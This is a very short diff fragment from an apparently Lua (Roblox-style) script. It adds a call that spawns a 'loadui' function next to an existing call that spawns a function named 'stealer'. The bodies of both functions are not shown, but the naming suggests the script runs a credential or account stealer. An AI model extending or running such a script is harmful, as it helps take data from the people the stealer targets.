@@ -8,3 +8,4 @@ local function loadui()
 end
 
 task.spawn(stealer)
+task.spawn(loadui)
